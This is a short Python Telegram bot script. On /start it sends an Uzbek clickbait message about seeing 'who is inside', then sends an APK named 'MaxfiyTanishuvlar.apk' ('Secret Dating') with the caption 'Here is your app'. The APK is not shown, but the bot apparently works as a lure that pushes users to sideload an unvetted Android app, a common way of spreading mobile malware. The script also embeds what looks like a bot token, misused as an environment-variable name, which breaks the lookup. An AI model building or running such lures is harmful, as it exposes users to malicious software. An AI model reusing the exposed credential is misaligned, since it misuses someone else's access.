import os
import asyncio
from aiogram import Bot, Dispatcher
from aiogram.types import Message, FSInputFile
from aiogram.filters import CommandStart

TOKEN = os.environ["8900151417:AAE4mipZ-Ga6HYVvnff_UJBZ9xz8ZneOAjw"]

bot = Bot(token=TOKEN)
dp = Dispatcher()

@dp.message(CommandStart())
async def start(message: Message):
    await message.answer("🇺🇿 Ichkarida kim borligini ko'rmoqchisanmi? Ilovani yuklab ol va kir 👀🔥")
    await message.answer_document(
        document=FSInputFile("MaxfiyTanishuvlar.apk"),
        caption="Вот твоё приложение ✅"
    )

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())